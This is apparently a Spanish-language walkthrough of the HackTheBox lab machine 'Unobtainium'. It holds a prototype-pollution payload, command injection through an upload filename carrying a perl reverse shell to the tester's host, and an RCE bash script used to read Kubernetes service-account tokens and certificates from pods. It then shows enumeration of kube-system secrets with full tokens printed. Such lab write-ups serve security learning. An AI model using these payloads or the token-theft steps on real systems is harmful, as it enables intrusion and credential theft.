33K Jun 11 18:23 package-lock.json π ~/htb/unobtainium/tests ❯ Shell - Container Tras identificar y explotar las vulnerabilidades en la API localmente, se replicó la explotacion en la maquina, ejecutando una shell inversa utilizando perl.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026#34;PUT http://127.0.0.1:3000/\u0026#34; { \u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; }, \u0026#34;message\u0026#34;: { \u0026#34;constructor\u0026#34;: { \u0026#34;prototype\u0026#34;: { \u0026#34;canDelete\u0026#34;: true, \u0026#34;canUpload\u0026#34;: true } } } } \u0026#34;POST http://127.0.0.1:3000/upload\u0026#34; { \u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; }, \u0026#34;filename\u0026#34;:\u0026#34;\u0026amp; perl -e \u0026#39;use Socket;$i=\\\u0026#34;10.10.14.10\\\u0026#34;;$p=1338;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\u0026#34;tcp\\\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\u0026#34;\u0026gt;\u0026amp;S\\\u0026#34;);open(STDOUT,\\\u0026#34;\u0026gt;\u0026amp;S\\\u0026#34;);open(STDERR,\\\u0026#34;\u0026gt;\u0026amp;S\\\u0026#34;);exec(\\\u0026#34;/bin/sh -i\\\u0026#34;);};\u0026#39;\u0026#34; } Logramos obtener una shell con el usuario root y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 π ~/htb/unobtainium ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.10] from unobtainium.htb [10.10.10.235] 51850 /bin/sh: 0: can\u0026#39;t access tty; job control turned off python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# ls -lah total 64K drwxr-xr-x 1 root root 4.0K Jun 12 00:40 . drwxr-xr-x 1 root root 4.0K Feb 21 22:43 .. -rw-r--r-- 1 root root 491 Mar 24 09:55 Dockerfile -rw-r--r-- 1 root root 46 Jan 21 15:01 clear-kubectl -rw-r--r-- 1 root root 119 Jun 11 23:49 hello.txt -rw-rw-r-- 1 root root 3.5K Feb 15 17:45 index.js drwxr-xr-x 53 root root 4.0K Feb 21 22:43 node_modules -rw-rw-r-- 1 root root 15K Jan 16 17:14 package-lock.json -rw-rw-r-- 1 root root 395 Jan 16 17:14 package.json -rw-r--r-- 1 root root 101 Jun 12 00:38 tmp -rw-rw-r-- 1 root root 262 Jan 17 03:41 todo.txt -rw-r--r-- 1 root root 14 Jun 12 01:05 x root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# cd /root root@webapp-deployment-5d764566f4-lrpt9:~# ls -lah total 12K drwxr-xr-x 2 root root 4.0K Feb 21 22:43 . drwxr-xr-x 1 root root 4.0K Jun 11 22:04 .. -rw-r--r-- 2 root root 33 Jun 11 22:04 user.txt root@webapp-deployment-5d764566f4-lrpt9:~# cat user.txt 9566ee99c9bbdbfda4fc4b5bc5628417 root@webapp-deployment-5d764566f4-lrpt9:~# Privesc - Kubernetes Listando los directorios (/) vemos el archivo .dockerenv que indica que es un contenedor, sin embargo, al listar las variables de entorno, encontramos variables que indican que es un contenedor (ó pod) de Kubernetes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@webapp-deployment-5d764566f4-lrpt9:~# env YARN_VERSION=1.22.5 WEBAPP_SERVICE_PORT_3000_TCP=tcp://10.96.137.170:3000 WEBAPP_SERVICE_PORT_3000_TCP_PROTO=tcp WEBAPP_SERVICE_PORT=tcp://10.96.137.170:3000 canDelete=true HOSTNAME=webapp-deployment-5d764566f4-lrpt9 OLDPWD=/usr/src/app KUBERNETES_PORT_443_TCP_PROTO=tcp KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 KUBERNETES_PORT=tcp://10.96.0.1:443 WEBAPP_SERVICE_SERVICE_PORT=3000 PWD=/root HOME=/root WEBAPP_SERVICE_PORT_3000_TCP_ADDR=10.96.137.170 KUBERNETES_SERVICE_PORT_HTTPS=443 canUpload=true KUBERNETES_PORT_443_TCP_PORT=443 NODE_VERSION=14.15.4 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 WEBAPP_SERVICE_PORT_3000_TCP_PORT=3000 SHLVL=1 WEBAPP_SERVICE_SERVICE_HOST=10.96.137.170 KUBERNETES_SERVICE_PORT=443 PATH=/root/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_SERVICE_HOST=10.96.0.1 _=/usr/bin/env root@webapp-deployment-5d764566f4-lrpt9:~# Tambien encontramos el archivo Dockerfile del contenedor vulnerable (Unobtainium APP).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# cat Dockerfile FROM node:14 RUN apt-get update \u0026amp;\u0026amp; apt-get -y install cron WORKDIR /usr/src/app COPY package*.json ./ COPY . . COPY clear-kubectl /etc/cron.d/clear-kubectl RUN chmod 0644 /etc/cron.d/clear-kubectl RUN crontab /etc/cron.d/clear-kubectl RUN touch /var/log/cron.log RUN ln -s /dev/null /root/.bash_history RUN ln -s /dev/null /home/node/.bash_history RUN echo \u0026#39;proc /proc proc defaults,hidepid=2 0 0\u0026#39; \u0026gt;\u0026gt; /etc/fstab CMD cron \u0026amp;\u0026amp; tail -f /var/log/cron.log EXPOSE 3000 CMD [ \u0026#34;node\u0026#34;, \u0026#34;index.js\u0026#34; ] root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# Kubectl En la maquina no existe kubectl, aunque si existe un cronjob que elimina archivos que tengan ese nombre.\n1 2 3 root@webapp-deployment-5d764566f4-lrpt9:~# crontab -l * * * * * find / -name kubectl -exec rm {} \\; root@webapp-deployment-5d764566f4-lrpt9:~# Descargamos kubectl en nuestra maquina y luego al contenedor para realizar enumeracion.\n1 2 3 4 5 6 7 # Local curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.21.0/bin/linux/amd64/kubectl python3 -m http.server 80 . # Remote wget 10.01.01.10/kubectl -O kiub chmod +x kiub Enumeracion Siguiendo la guia de hacktricks obtuvimos informacion. Inicialmente configuramos una variable para la ejecucion de kubectl en la cual agregamos el token y el certificado los cuales encontramos en /run/secrets/kubernetes.io/serviceaccount junto con la direccion IP del servidor el cual encontramos en las variables de entorno.\n1 export kube=\u0026#34;/root/kiub --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server=https://10.96.0.1:443\u0026#34; Namespaces Con ello enumeramos los namespaces, ademas, listamos los actions que tenemos en cada uno, solamente en dev podemos listar los pods, en los demás solo los namespaces, es decir estamos limitados a listar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 root@webapp-deployment-5d764566f4-lrpt9:~# export kube=\u0026#34;/root/kiub --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server=https://10.96.0.1:443\u0026#34; root@webapp-deployment-5d764566f4-lrpt9:~# $kube get namespaces NAME STATUS AGE default Active 149d dev Active 149d kube-node-lease Active 149d kube-public Active 149d kube-system Active 149d root@webapp-deployment-5d764566f4-lrpt9:~# $kube auth can-i --list -n dev Resources Non-Resource URLs Resource Names Verbs selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] namespaces [] [] [get list] pods [] [] [get list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [/api] [] [get] [/apis/*] [] [get] [/apis] [] [get] [/healthz] [] [get] [/healthz] [] [get] [/livez] [] [get] [/livez] [] [get] [/openapi/*] [] [get] [/openapi] [] [get] [/openid/v1/jwks] [] [get] [/readyz] [] [get] [/readyz] [] [get] [/version/] [] [get] [/version/] [] [get] [/version] [] [get] [/version] [] [get] Pod Dev Enumeramos los pods en dev y encontramos tres, realizamos solicitudes con curl, describimos cada uno de estos y encontramos que son una replica de la web app de Unobtainium API en la cual obtuvimos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 root@webapp-deployment-5d764566f4-lrpt9:~# $kube -n dev get pods NAME READY STATUS RESTARTS AGE devnode-deployment-cd86fb5c-6ms8d 1/1 Running 28 149d devnode-deployment-cd86fb5c-mvrfz 1/1 Running 29 149d devnode-deployment-cd86fb5c-qlxww 1/1 Running 29 149d root@webapp-deployment-5d764566f4-lrpt9:~# $kube -n dev describe pod devnode-deployment-cd86fb5c-6ms8d Name: devnode-deployment-cd86fb5c-6ms8d Namespace: dev Priority: 0 Node: unobtainium/10.10.10.235 Start Time: Sun, 17 Jan 2021 18:16:21 +0000 Labels: app=devnode pod-template-hash=cd86fb5c Annotations: \u0026lt;none\u0026gt; Status: Running IP: 172.17.0.3 IPs: IP: 172.17.0.3 Controlled By: ReplicaSet/devnode-deployment-cd86fb5c Containers: devnode: Container ID: docker://e846ace4fd6ff238743a8c866733a2f69dadbaf750fa2af6a0544ac3c31d9327 Image: localhost:5000/node_server Image ID: docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c Port: 3000/TCP Host Port: 0/TCP State: Running Started: Tue, 15 Jun 2021 14:14:34 +0000 Last State: Terminated Reason: Error Exit Code: 137 Started: Wed, 24 Mar 2021 16:01:28 +0000 Finished: Wed, 24 Mar 2021 16:02:13 +0000 Ready: True Restart Count: 28 Environment: \u0026lt;none\u0026gt; Mounts: /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro) Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled True Volumes: default-token-rmcd6: Type: Secret (a volume populated by a Secret) SecretName: default-token-rmcd6 Optional: false QoS Class: BestEffort Node-Selectors: \u0026lt;none\u0026gt; Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events: \u0026lt;none\u0026gt; root@webapp-deployment-5d764566f4-lrpt9:~# Token \u0026amp; Ca.crt - Pods Con las direccion IPs de cada pod, y mediante un script en bash ejecutamos comandos en la webapp para obtener el token y certificado de cada pod.\n1 2 3 4 5 6 root@webapp-deployment-5d764566f4-lrpt9:~# $kube -n dev get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES devnode-deployment-cd86fb5c-6ms8d 1/1 Running 28 149d 172.17.0.3 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; devnode-deployment-cd86fb5c-mvrfz 1/1 Running 29 149d 172.17.0.5 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; devnode-deployment-cd86fb5c-qlxww 1/1 Running 29 149d 172.17.0.6 unobtainium \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; root@webapp-deployment-5d764566f4-lrpt9:~# El script da permisos, ejecuta un comando y guarda el resultado en un archivo, finalmente se realiza la lectura de dicho archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #! /usr/bin/env bash RED=\u0026#34;\\e[31m\u0026#34; GREEN=\u0026#34;\\e[32m\u0026#34; ENDCOLOR=\u0026#34;\\e[0m\u0026#34; if [ $# -eq 0 ]; then echo -e \u0026#34;${RED}URL and CMD not provided. ${ENDCOLOR}\u0026#34; exit 1 fi echo -e \u0026#34;${GREEN}[+] Giving Permissions ... ${ENDCOLOR}\u0026#34; curl -sI -X PUT \u0026#34;$1/\u0026#34; --header \u0026#39;Content-Type: application/json\u0026#39; \\ --data-raw \u0026#39;{ \u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; }, \u0026#34;message\u0026#34;: { \u0026#34;constructor\u0026#34;: { \u0026#34;prototype\u0026#34;: { \u0026#34;canDelete\u0026#34;: true, \u0026#34;canUpload\u0026#34;: true } } } }\u0026#39; sleep 0.02 echo -e \u0026#34;${GREEN}[+] Sending CMD $2. ${ENDCOLOR}\u0026#34; CMD=$2 PART1=\u0026#39;{\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;,\u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;},\u0026#34;filename\u0026#34;:\u0026#34;\u0026amp;\u0026#39; PART2=\u0026#39;\u0026gt; x\u0026#34;}\u0026#39; curl -s -X POST \u0026#34;$1/upload\u0026#34; --header \u0026#39;Content-Type: application/json\u0026#39; --data-raw \u0026#34;$PART1$CMD$PART2\u0026#34; | python -c \u0026#39;import json,sys;obj=json.load(sys.stdin);print obj[\u0026#34;Uploaded_File\u0026#34;]\u0026#39; sleep 0.02 echo -e \u0026#34;${GREEN}[+] Output of $2. ${ENDCOLOR}\u0026#34; curl -s -X POST \u0026#34;$1/todo\u0026#34; --header \u0026#39;Content-Type: application/json\u0026#39; \\ --data-raw \u0026#39;{\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;}, \u0026#34;filename\u0026#34; : \u0026#34;x\u0026#34;}\u0026#39; | python -c \u0026#39;import json,sys;obj=json.load(sys.stdin);print obj[\u0026#34;content\u0026#34;]\u0026#39; sleep 0.02 Al tener los token y certificados les dimos permisos de lectura chmod 600 *.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 root@webapp-deployment-5d764566f4-lrpt9:~/k_info# ls -lah total 32K drwxr-xr-x 2 root root 4.0K Jun 16 05:29 . drwxr-xr-x 4 root root 4.0K Jun 16 05:39 .. -rw------- 1 root root 889 Jun 16 05:28 k3 -rw------- 1 root root 1.1K Jun 16 05:28 k3_cert -rw------- 1 root root 889 Jun 16 05:29 k5 -rw------- 1 root root 1.1K Jun 16 05:29 k5_cert -rw------- 1 root root 889 Jun 16 05:29 k6 -rw------- 1 root root 1.1K Jun 16 05:29 k6_cert root@webapp-deployment-5d764566f4-lrpt9:~/k_info# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 # http://172.17.0.3:3000 root@webapp-deployment-5d764566f4-lrpt9:~# rce.sh http://172.17.0.3:3000 \u0026#34;cat /run/sec*/k*/se*/token \u0026gt; k3 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k3 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k3 \u0026amp;\u0026amp; echo \u0026#39;k3\u0026#39;\u0026#34; [+] Giving Permissions ... [+] Sending CMD cat /run/sec*/k*/se*/token \u0026gt; k3 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k3 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k3 \u0026amp;\u0026amp; echo \u0026#39;k3\u0026#39;. [+] Output of cat /run/sec*/k*/se*/token \u0026gt; k3 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k3 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k3 \u0026amp;\u0026amp; echo \u0026#39;k3\u0026#39;. k3 root@webapp-deployment-5d764566f4-lrpt9:~# rce.sh http://172.17.0.3:3000 \u0026#34;cat k3\u0026#34; [+] Giving Permissions ... [+] Sending CMD cat k3. [+] Output of cat k3. eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1[...REDACTED...]xeggOo5ZjbLOyQSuVFpn43TIw-----BEGIN CERTIFICATE----- MIIC5zCCAc+gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p a3ViZUNBMB4XDTIxMDEwNzEzMjQ0OVoXDTMxMDEwNjEzMjQ0OVowFTETMBEGA1UE [...REDACTED...] q465ixPZqFqVchxQFQ+pZ24KiqoQW4mam/x5FPy13+Mw8J4zb8vLduvLQR3wpUGb vKXdnKOLWsiExyrjpZjZbYBL8b705XFFGvmabp21aG8psB1XvsLiGFQEqyDfeFRW hl7KpUISl4+Np5sAiXNwtbSDE+22QVtZbuDn -----END CERTIFICATE----- dev root@webapp-deployment-5d764566f4-lrpt9:~# # http://172.17.0.5:3000 root@webapp-deployment-5d764566f4-lrpt9:~# rce.sh http://172.17.0.5:3000 \u0026#34;cat /run/sec*/k*/se*/token \u0026gt; k5 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k5 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k5 \u0026amp;\u0026amp; echo \u0026#39;k5\u0026#39;\u0026#34; [+] Giving Permissions ... [+] Sending CMD cat /run/sec*/k*/se*/token \u0026gt; k5 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k5 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k5 \u0026amp;\u0026amp; echo \u0026#39;k5\u0026#39;. [+] Output of cat /run/sec*/k*/se*/token \u0026gt; k5 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k5 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k5 \u0026amp;\u0026amp; echo \u0026#39;k5\u0026#39;. k5 root@webapp-deployment-5d764566f4-lrpt9:~# rce.sh http://172.17.0.5:3000 \u0026#34;cat k5\u0026#34; [+] Giving Permissions ... [+] Sending CMD cat k5. [+] Output of cat k5. eyJhbGciOiJSUzI1NiIsImtpZC[...REDACTED...]xeggOo5ZjbLOyQSuVFpn43TIw-----BEGIN CERTIFICATE----- MIIC5zCCAc+gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p a3ViZUNBMB4XDTIxMDEwNzEzMjQ0OVoXDTMxMDEwNjEzMjQ0OVowFTETMBEGA1UE [...REDACTED...] q465ixPZqFqVchxQFQ+pZ24KiqoQW4mam/x5FPy13+Mw8J4zb8vLduvLQR3wpUGb vKXdnKOLWsiExyrjpZjZbYBL8b705XFFGvmabp21aG8psB1XvsLiGFQEqyDfeFRW hl7KpUISl4+Np5sAiXNwtbSDE+22QVtZbuDn -----END CERTIFICATE----- dev root@webapp-deployment-5d764566f4-lrpt9:~# # http://172.17.0.6:3000 root@webapp-deployment-5d764566f4-lrpt9:~# rce.sh http://172.17.0.6:3000 \u0026#34;cat /run/sec*/k*/se*/token \u0026gt; k6 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k6 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k6 \u0026amp;\u0026amp; echo \u0026#39;k6\u0026#39;\u0026#34; [+] Giving Permissions ... [+] Sending CMD cat /run/sec*/k*/se*/token \u0026gt; k6 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k6 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k6 \u0026amp;\u0026amp; echo \u0026#39;k6\u0026#39;. [+] Output of cat /run/sec*/k*/se*/token \u0026gt; k6 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/ca.crt \u0026gt;\u0026gt; k6 \u0026amp;\u0026amp; cat /run/sec*/k*/se*/namespace \u0026gt;\u0026gt; k6 \u0026amp;\u0026amp; echo \u0026#39;k6\u0026#39;. k6 root@webapp-deployment-5d764566f4-lrpt9:~# rce.sh http://172.17.0.6:3000 \u0026#34;cat k6\u0026#34; [+] Giving Permissions ... [+] Sending CMD cat k6. [+] Output of cat k6. eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9i[...REDACTED...]ZjbLOyQSuVFpn43TIw-----BEGIN CERTIFICATE----- MIIC5zCCAc+gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p a3ViZUNBMB4XDTIxMDEwNzEzMjQ0OVoXDTMxMDEwNjEzMjQ0OVowFTETMBEGA1UE [...REDACTED...] q465ixPZqFqVchxQFQ+pZ24KiqoQW4mam/x5FPy13+Mw8J4zb8vLduvLQR3wpUGb vKXdnKOLWsiExyrjpZjZbYBL8b705XFFGvmabp21aG8psB1XvsLiGFQEqyDfeFRW hl7KpUISl4+Np5sAiXNwtbSDE+22QVtZbuDn -----END CERTIFICATE----- dev root@webapp-deployment-5d764566f4-lrpt9:~# Enum Actions -\u0026gt; Namespaces Con los tokens y certificados podemos enumerar las acciones que podemos ejecutar en los namespaces, y con suerte alguno de estos podria darnos acceso a otro tipo de action.\n1 /root/kiub --token=$(cat /root/k_info/\u0026lt;token_name\u0026gt;) --certificate-authority=/root/k_info/\u0026lt;ca_cert_name\u0026gt; --server=https://10.96.0.1:443 auth can-i --list -n \u0026lt;NAMESPACE\u0026gt; Algunos de los tokens y certificados mostraron que es posible obtener los secrets del namespace kube-system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@webapp-deployment-5d764566f4-lrpt9:~/k_info# /root/kiub --token=$(cat /root/k_info/k3) --certificate-authority=/root/k_info/k3_cert --server=https://10.96.0.1:443 auth can-i --list -n kube-system Resources Non-Resource URLs Resource Names Verbs selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] secrets [] [] [get list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [ ... REDACTED... ] [/version] [] [get] root@webapp-deployment-5d764566f4-lrpt9:~/k_info# /root/kiub --token=$(cat /root/k_info/k5) --certificate-authority=/root/k_info/k5_cert --server=https://10.96.0.1:443 auth can-i --list -n kube-system Resources Non-Resource URLs Resource Names Verbs selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] secrets [] [] [get list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [ ... REDACTED... ] [/version] [] [get] root@webapp-deployment-5d764566f4-lrpt9:~/k_info# /root/kiub --token=$(cat /root/k_info/k6) --certificate-authority=/root/k_info/k6_cert --server=https://10.96.0.1:443 auth can-i --list -n kube-system Resources Non-Resource URLs Resource Names Verbs selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] secrets [] [] [get list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [ ... REDACTED... ] [/version] [] [get] root@webapp-deployment-5d764566f4-lrpt9:~/k_info# Secrets -\u0026gt; Kube-System Utilizamos un for para enumerar los secrets en el namespace kube-system especificamente los tokens, además grepeamos el output para mostrar las acciones create .\n1 for token in `/root/kiub --token=$(cat /root/k_info/k6) --certificate-authority=/root/k_info/k6_cert --server=https://10.96.0.1:443 describe secrets -n kube-system | grep \u0026#34;token:\u0026#34; | cut -d \u0026#34; \u0026#34; -f 7`; do echo $token; /root/kiub --token $token auth can-i --list | grep \u0026#34;create\u0026#34;; echo; done El output del for es muy grande pero buscamos principalmente un token que tenga permitido crear pods. Vemos que uno de estos tokens (pestaña 1) puede crear pods, incluso algunas otras acciones, además vemos multiples tokens (pestaña 2) que tienen un resultado similar.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwZXJzaXN0ZW50LXZvbHVtZS1iaW5kZXItdG9rZW4tZmQyOTIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoicGVyc2lzdGVudC12b2x1bWUtYmluZGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiZTBmNGRkMjAtNTA2ZS00NWY2LTg5Y2MtMDY4MTVlNzY5ZTk0Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOnBlcnNpc3RlbnQtdm9sdW1lLWJpbmRlciJ9.QrwIUdAKVoBZcoCGn5DTDYw9EyhdA9WU2Uj5snWJo-J59iPljVBhdhdnoDEAwWXzCE76PN_EBUIF87KnAc0PUk8h5xEgykNErplvZ-7mpZI6s-wq180BTf6A4Ej-x-27Vo4pEKsFUbDLd_eY9vAIlXFoMFTheDjDgl-IXq4g0-QMDPxiGut5Z4DBc-RPmvt3csc-Wrs-ZjAhpL6PoscRqNEgsoeV5bpYbtp3kvAJ5hKdDeboj3-1H-iQL3RbDhMAyqsT-lINoDaHAImo5umWZlHeDQBDeZgNxMwqLkbBgQVCTNgcAQlt218yLi9LQLIWMOUTyyfLp0i3_TepH3rwLA persistentvolumes [] [] [create delete get list update watch] pods [] [] [create delete get list watch] endpoints [] [] [create delete get update] services [] [] [create delete get] events.events.k8s.io [] [] [create patch update] selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] persistentvolumeclaims [] [] [get list update watch] persistentvolumeclaims/status [] [] [update] persistentvolumes/status [] [] [update] events [] [] [watch create patch update] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 root@webapp-deployment-5d764566f4-lrpt9:~/k_info# for token in `/root/kiub --token=$(cat /root/k_info/k6) --certificate-authority=/root/k_info/k6_cert --server=https://10.96.0.1:443 describe secrets -n kube-system | grep \u0026#34;token:\u0026#34; | cut -d \u0026#34; \u0026#34; -f 7`; do echo \u0026#34;token: $token\u0026#34;; /root/kiub --token $token auth can-i --list | grep \u0026#34;create\\|update\u0026#34;; echo; done eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJnZW5lcmljLWdhcmJhZ2UtY29sbGVjdG9yLXRva2VuLTJobmc0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImdlbmVyaWMtZ2FyYmFnZS1jb2xsZWN0b3IiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI3M2U1NzUxZi01MWIxLTQ1N2UtOTU2NC0wMTY2NjZlYTAxNzEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Z2VuZXJpYy1nYXJiYWdlLWNvbGxlY3RvciJ9.CO6tGO3YjvE47qPEbXdoEh8Ec1J8F5v0Quqye_eG9FiAU7rASYipmFu7d_EnKi07zhjjM9ydit4gFho9XhEKq8RdwoIufkd2EGLpnHGjAZFy2uR_vam9jmepZOMj5Foebasm4zO93bXQT1y5JLvR07OxeZ71eNm9SqblPATqI7EVcERn3YPnOrLdPkpsx-LQFICfUR8TrgqmoBXYwyj93UC9e53jdAE-HOebpuYVV2kFUk3zYGcsZMErgSUMetDGqyfNgu4dNFX2eau8RZ-MTfn0eK1j_KqjonqbnITVEz0b70b6FRAMWGOhNYKLVC3_l-dnTW2mmsFWMppLTgO_yg events [] [] [create patch update] events.events.k8s.io [] [] [create patch update] selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] *.* [] [] [delete get list patch update watch] 